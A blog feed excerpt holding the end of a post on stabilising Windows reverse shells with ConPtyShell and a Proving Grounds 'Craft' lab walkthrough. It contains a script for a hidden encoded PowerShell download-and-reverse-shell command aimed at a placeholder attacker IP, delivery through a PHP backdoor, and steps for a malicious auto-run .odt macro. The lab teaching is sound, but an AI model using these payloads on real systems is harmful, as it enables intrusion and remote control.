&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;IEX(New-Object System.Net.WebClient).DownloadString(&quot;http://&amp;lt;ATTACK-IP&amp;gt;/Invoke-ConPtyShell.ps1&quot;);Invoke-ConPtyShell &amp;lt;ATTACK-IP&amp;gt; &amp;lt;ATTACK-PORT&amp;gt; -Rows &amp;lt;ROWS&amp;gt; -Cols &amp;lt;COLS&amp;gt;&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;powershell -nop -w hidden -e &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;utf16&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[1;37m[*] Encoded command: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[1;00m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[1;33m&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[00m&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;ATTACK-IP&amp;gt;&lt;/code&gt;: Attack machine&amp;#39;s IP address.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;ATTACK-PORT&amp;gt;&lt;/code&gt;: Attack machine&amp;#39;s &lt;code&gt;nc&lt;/code&gt; reverse shell listener port.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;ROWS&amp;gt;&lt;/code&gt;: Number of terminal rows.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;COLS&amp;gt;&lt;/code&gt;: Number of terminal columns.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Once you&amp;#39;ve entered all IP, port, and terminal information, execute the Python script using &lt;code&gt;python3 conpty.py&lt;/code&gt; to output the encoded PowerShell command.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/MyTools/ConPtyShell]
â””â”€$ python3 conpty.py          
[*] Encoded command: powershell -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h1&gt;Execution&lt;/h1&gt;

&lt;p&gt;All that is left to do is copy the command and execute it via your target&amp;#39;s RCE vulnerability. This example uses a PHP backdoor.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/MyTools/ConPtyShell]
â””â”€$ curl -b &quot;wordpress_d407...&quot; &quot;http://192.168.X.X/foo/bar-content/plugins/askimet/?cmd=powershell%20-nop%20-w%20hidden%20-e%20SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you navigate back to the Python HTTP server terminal, you&amp;#39;ll notice the target has downloaded the PowerShell script.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/MyTools/ConPtyShell]
â””â”€$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.X.X - - [08/Sep/2025 21:49:58] &quot;GET /Invoke-ConPtyShell.ps1 HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Navigate to the reverse shell listener terminal and enjoy your fully interactive Windows reverse shell, &lt;code&gt;Ctrl + C&lt;/code&gt; and all!&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\foo\htdocs\bar&amp;gt; whoami
bar\corpuser
PS C:\foo\htdocs\bar&amp;gt; ^C
PS C:\foo\htdocs\bar&amp;gt; ^C
PS C:\foo\htdocs\bar&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        <pubDate>Tue, 09 Sep 2025 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/2025/When-Shells-Stabilize/</link>
        <guid isPermaLink="true">http://localhost:4000/2025/When-Shells-Stabilize/</guid>
        
        
      </item>
    
      <item>
        <title>Proving Grounds Craft: Walkthrough</title>
        <description>&lt;p&gt;This post provides a step-by-step walkthrough of the Proving Grounds machine Craft. I decided to write up the entire machine because it is a great example of how enabled content in documents can be weaponized against an end user. Ever wonder why you sometimes see a word doc banner saying macros have been disabled? This machine is the answer. As always, for anyone working through the PG practice machines, spoilers are ahead!&lt;/p&gt;

&lt;h1&gt;Enumeration&lt;/h1&gt;

&lt;p&gt;I&amp;#39;ll start by kicking off an &lt;code&gt;nmap&lt;/code&gt; scan of all 65535 TCP ports to see what we&amp;#39;re working with.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Nmap-Tcp-Scan-1.png&quot; alt=&quot;nmap TCP Scan 1&quot;&gt;&lt;/p&gt;

&lt;p&gt;It looks like the target is blocking ICMP packets. Not a problem, &lt;code&gt;nmap&lt;/code&gt; can be instructed to skip host discovery using the &lt;code&gt;-Pn&lt;/code&gt; flag. Let&amp;#39;s try that again.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Nmap-Tcp-Scan-2.png&quot; alt=&quot;nmap TCP Scan 2&quot;&gt;&lt;/p&gt;

&lt;p&gt;The scan only returned port 80, which is serving some sort of HTTP service. Let&amp;#39;s gather more information about this service with an aggressive scan.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Nmap-Tcp-Scan-3.png&quot; alt=&quot;nmap TCP Scan 3&quot;&gt;&lt;/p&gt;

&lt;p&gt;The scan didn&amp;#39;t return anything too noteworthy, but I&amp;#39;ll jot down the service names and versions to research later. As a side note, make sure to enumerate UDP ports as well. In this particular case, the scan didn&amp;#39;t return any ports.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Nmap-Udp-Scan.png&quot; alt=&quot;nmap UDP Scan&quot;&gt;&lt;/p&gt;

&lt;h2&gt;Web Application Enumeration&lt;/h2&gt;

&lt;p&gt;HTTP(S) services call for directory/file brute forcing. I&amp;#39;ll use the &lt;code&gt;gobuster&lt;/code&gt; &lt;strong&gt;dir&lt;/strong&gt; mode and provide the &lt;code&gt;-x&lt;/code&gt; flag to specify the file extensions I want to test. It doesn&amp;#39;t take long to find some interesting stuff like &lt;code&gt;/uploads&lt;/code&gt; and &lt;code&gt;/upload.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Gobuster-Scan.png&quot; alt=&quot;gobuster Scan&quot;&gt;&lt;/p&gt;

&lt;p&gt;I&amp;#39;ll browse out to the root directory in Firefox to see what the rendered page looks like. Google Translate wasn&amp;#39;t any help, but it&amp;#39;s safe to assume that this is some sort of business website. Further down the page, I found an upload feature for submitting resumes!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Craft-Landing-Page.png&quot; alt=&quot;Craft Landing Page&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Craft-Upload.png&quot; alt=&quot;Craft Upload&quot;&gt;&lt;/p&gt;

&lt;p&gt;To test the upload function, I will provide a simple text file to see what happens. It appears this &lt;code&gt;upload.php&lt;/code&gt; file checks the file extension to ensure only &lt;code&gt;.odt&lt;/code&gt; files are allowed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Craft-Upload-Test-1.png&quot; alt=&quot;Craft Upload Test 1&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Craft-Upload-Test-2.png&quot; alt=&quot;Craft Upload Test 2&quot;&gt;&lt;/p&gt;

&lt;p&gt;Now it&amp;#39;s time to enlist the help of BurpSuite to modify the POST request. I spent a lot of time messing with different PHP file extensions and some null byte shenanigans, but nothing worked. If I want to upload a file to this web server, it must have a &lt;code&gt;.odt&lt;/code&gt; file extension.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Craft-Upload-BurpSuite.png&quot; alt=&quot;Craft Upload BurpSuite&quot;&gt;&lt;/p&gt;

&lt;h2&gt;.odt File Research &amp;amp; Creation&lt;/h2&gt;

&lt;p&gt;Having created malicous Office 365 macros in the past, I assume LibreOffice may have similar functions that can be abused. I did some Googling and found this &lt;a href=&quot;https://medium.com/@akshay__0/initial-access-via-malicious-odt-macro-ac7f5d15796d&quot;&gt;Medium article&lt;/a&gt; detailing malicious &lt;code&gt;.odt&lt;/code&gt; file macros. The syntax for this macro is specific to Linux machines, so the script itself is not useful to me, but the instructions for creating a LibreOffice macro are still of value.&lt;/p&gt;

&lt;p&gt;Knowing this, I searched for Microsoft VBA Macro reverse shell scripts and found another &lt;a href=&quot;https://medium.com/@mavrogiannispan/phishing-2-0-9f49654de4a6&quot;&gt;Medium Article&lt;/a&gt; written by Mavrogiannis Panagiotis that contained proper syntax for Windows targets. First, I need to create a malicious document in LibreOffice. Select &lt;strong&gt;File &amp;gt; New &amp;gt; Text Document&lt;/strong&gt; to create a new file. Once the document window opens, navigate to &lt;strong&gt;File &amp;gt; Save As..&lt;/strong&gt; and save the file, ensuring the &lt;code&gt;.odt&lt;/code&gt; extension is specified.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Odt-Step-1.png&quot; alt=&quot;Odt Step 1&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Odt-Step-2.png&quot; alt=&quot;Odt Step 2&quot;&gt;&lt;/p&gt;

&lt;p&gt;Next, I will select &lt;strong&gt;Tools &amp;gt; Macros &amp;gt; Organize Macros &amp;gt; Basic...&lt;/strong&gt; to open up the &lt;em&gt;BASIC Macros&lt;/em&gt; window. In the window, select the name of the saved document and then click the &lt;strong&gt;New&lt;/strong&gt; button on the right-hand side to create a new module. In the pop-up window, provide a name for the module and click &lt;strong&gt;Ok&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Odt-Step-3.png&quot; alt=&quot;Odt Step 3&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Odt-Step-4.png&quot; alt=&quot;Odt Step 4&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Odt-Step-5.png&quot; alt=&quot;Odt Step 5&quot;&gt;&lt;/p&gt;

&lt;p&gt;Now I can copy the script structure from the Medium article and paste it into the macro window.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Odt-Step-6.png&quot; alt=&quot;Odt Step 6&quot;&gt;&lt;/p&gt;

&lt;p&gt;You may have noticed that I left out the entire string from the &lt;code&gt;objshell.Run&lt;/code&gt; line. I am slightly modifying the VBA script example by generating a PowerShell Base64-encoded reverse shell command using &lt;code&gt;msfvenom&lt;/code&gt;. I prefer this format because I don&amp;#39;t have to fiddle with quotations within quotations, which can be a headache at times. I&amp;#39;ll copy everything starting from &lt;code&gt;powershell.exe&lt;/code&gt; and paste into the empty double quotes in my script.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Odt-Step-7.png&quot; alt=&quot;Odt Step 7&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Odt-Step-8.png&quot; alt=&quot;Odt Step 8&quot;&gt;&lt;/p&gt;

&lt;p&gt;The last step is to tie this macro to an event. I want this script to execute immediately after the document is opened. To do this, I&amp;#39;ll navigate to &lt;strong&gt;Tools &amp;gt; Customize&lt;/strong&gt;. Inside the &lt;em&gt;Customize&lt;/em&gt; window, click the  &lt;strong&gt;Events&lt;/strong&gt; button, select the &lt;strong&gt;Open Document&lt;/strong&gt; event, and click &lt;strong&gt;Macro...&lt;/strong&gt; on the right-hand side.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Odt-Step-9.png&quot; alt=&quot;Odt Step 9&quot;&gt;&lt;/p&gt;

&lt;p&gt;Expand the document tree until you find the macro name and select it. Click &lt;strong&gt;Ok&lt;/strong&gt; on the &lt;em&gt;Macro Selector&lt;/em&gt; and &lt;em&gt;Customize&lt;/em&gt; windows. Once back in the document window, press &lt;code&gt;Ctrl + S&lt;/code&gt; one more time for good measure and close LibreOffice.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Odt-Step-10.png&quot; alt=&quot;Odt Step 10&quot;&gt;&lt;/p&gt;

&lt;h1&gt;Initial Access&lt;/h1&gt;

&lt;p&gt;Now it&amp;#39;s time to upload the &lt;code&gt;.odt&lt;/code&gt; file. Before I do that, I first need to setup a listener on Kali to catch the reverse shell connection. I am prepending my &lt;code&gt;nc&lt;/code&gt; command with &lt;code&gt;rlwrap&lt;/code&gt; which will help stabilize the Windows shell.&lt;/p&gt;

&lt;p&gt;Browse out to the root web directory again, select the saved &lt;code&gt;.odt&lt;/code&gt; file, and click the &lt;strong&gt;Upload&lt;/strong&gt; button.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_InitialAccess-Step-1.png&quot; alt=&quot;InitialAccess Step 1&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_InitialAccess-Step-2.png&quot; alt=&quot;InitialAccess Step 2&quot;&gt;&lt;/p&gt;

&lt;p&gt;After a few seconds pass, a reverse shell is received from the target!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_InitialAccess-Step-3.png&quot; alt=&quot;InitiAccess Step 3&quot;&gt;&lt;/p&gt;

&lt;h1&gt;Post-Exploitation Enumeration&lt;/h1&gt;

&lt;p&gt;Let&amp;#39;s see if there are any flags we can access as &lt;strong&gt;thecybergeek&lt;/strong&gt;. This is a PowerShell one-liner that I use to scrape flag content in the &lt;code&gt;C:\Users\&lt;/code&gt; directory.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;Get-ChildItem&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Include&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;local.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;proof.txt&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Recurse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ErrorAction&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SilentlyContinue&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[!] &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$PSItem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FullName&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;`r`n`t&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Content&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$PSItem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FullName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;}
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Local.png&quot; alt=&quot;Local&quot;&gt;&lt;/p&gt;

&lt;p&gt;Local is now captured! Moving onto further enumeration, I&amp;#39;ll start with examining service information to check for any unquoted service paths using another PowerShell one-liner.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;Get-CimInstance&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ClassName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;win32_service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Select&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;State&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PathName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Where-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$PSItem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;State&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Running&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I immediately notice a custom service named &lt;strong&gt;ResumeService1&lt;/strong&gt; with an unquoted service path of &lt;code&gt;C:\Program Files\nssm-2.24\win64\nssm.exe&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Post-Exploit-Enum-Unquoted-1.png&quot; alt=&quot;Post Exploit Enum 1&quot;&gt;&lt;/p&gt;

&lt;p&gt;If my current user has write access to the &lt;code&gt;C:\&lt;/code&gt; directory, I could place a malicious executable there, restart the service, and send myself an NT Authority\SYSTEM shell (assuming it is running with SYSTEM privileges). Unfortunately, my user cannot create files in that directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Post-Exploit-Enum-Unquoted-2.png&quot; alt=&quot;Post Exploit Enum 2&quot;&gt;&lt;/p&gt;

&lt;p&gt;I didn&amp;#39;t find anything noteworthy my current user&amp;#39;s home directory, nor do I have any interesting privileges. I decided to enumerate all of the users on the target and noticed an &lt;strong&gt;apache&lt;/strong&gt; username. What if I have write access to the Apache root directory?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Post-Exploit-Enum-Apache-1.png&quot; alt=&quot;Post Exploit Enum Apache 1&quot;&gt;&lt;/p&gt;

&lt;h2&gt;Lateral Movement&lt;/h2&gt;

&lt;p&gt;To find the root directory, I remembered from my &lt;code&gt;gobuster&lt;/code&gt; enumeration that I found a file called &lt;code&gt;upload.php&lt;/code&gt;. I can search for that filename to locate the root directory of the Apache web server. Once I discovered the &lt;code&gt;C:\xampp\htdocs\&lt;/code&gt; root directory, I attempted to write a text file to that location and it worked! I further verified this by curling the new web server file from Kali.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;Get-ChildItem&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Filter&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;upload.php&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Recurse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-File&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ErrorAction&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SilentlyContinue&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$PSItem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FullName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Post-Exploit-Enum-Apache-2.png&quot; alt=&quot;Post Exploit Enum Apache 2&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Post-Exploit-Enum-Apache-3.png&quot; alt=&quot;Post Exploit Enum Apache 3&quot;&gt;&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve confirmed my write access on the Apache web server. Now I just need to write a PHP backdoor file instead of a text file. I&amp;#39;ll host the &lt;code&gt;simple-backdoor.php&lt;/code&gt; file from Kali using a Python HTTP server and download the file using the &lt;code&gt;Invoke-WebRequest&lt;/code&gt; Cmdlet.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Post-Exploit-Enum-Apache-4.png&quot; alt=&quot;Post Exploit Enum Apache 4&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Post-Exploit-Enum-Apache-5.png&quot; alt=&quot;Post Exploit Enum Apache 5&quot;&gt;&lt;/p&gt;

&lt;p&gt;I now have code execution as &lt;strong&gt;apache&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Post-Exploit-Enum-Apache-6.png&quot; alt=&quot;Post Exploit Enum Apache 6&quot;&gt;&lt;/p&gt;

&lt;p&gt;Following the same form as the &lt;code&gt;.odt&lt;/code&gt; file macro, I&amp;#39;ll once again lean on &lt;code&gt;msfvenom&lt;/code&gt; to generate a PowerShell Base64-encoded reverse shell command to avoid URL encoding shenanigans. I can&amp;#39;t avoid URL encoding entirely, I&amp;#39;ll need to replace the spaces in my command with either &lt;code&gt;%20&lt;/code&gt; or &lt;code&gt;+&lt;/code&gt; characters to make the URL valid. If you are entering this command from the browser, this step will be automated. Don&amp;#39;t forget to setup the &lt;code&gt;nc&lt;/code&gt; listener on Kali before executing the command!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Post-Exploit-Enum-Apache-7.png&quot; alt=&quot;Post Exploit Enum Apache 7&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Post-Exploit-Enum-Apache-8.png&quot; alt=&quot;Post Exploit Enum Apache 8&quot;&gt;&lt;/p&gt;

&lt;p&gt;I now have a shell as the &lt;strong&gt;apache&lt;/strong&gt; user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_Post-Exploit-Enum-Apache-9.png&quot; alt=&quot;Post Exploit Enum Apache 9&quot;&gt;&lt;/p&gt;

&lt;h1&gt;Privilege Escalation&lt;/h1&gt;

&lt;p&gt;Full disclosure, I hit a mental roadblock on privilege escalation for a good while. The first rabbit hole I fell down was the &lt;code&gt;C:\output.txt&lt;/code&gt; file produced by a PowerShell script using the &lt;code&gt;Start-Transcript&lt;/code&gt; Cmdlet. In the generated transcription banner, it references the PowerShell script used, which was &lt;code&gt;C:\freezeScript\win10.ps1&lt;/code&gt;. I created a PowerShell reverse shell script under the same path and name, hoping this was some sort of scheduled task, but I never received a shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/PG-Craft-Walkthrough_PrivEsc-Output-File.png&quot; alt=&quot;Priv Esc Output File&quot;&gt;&lt;/p&gt;

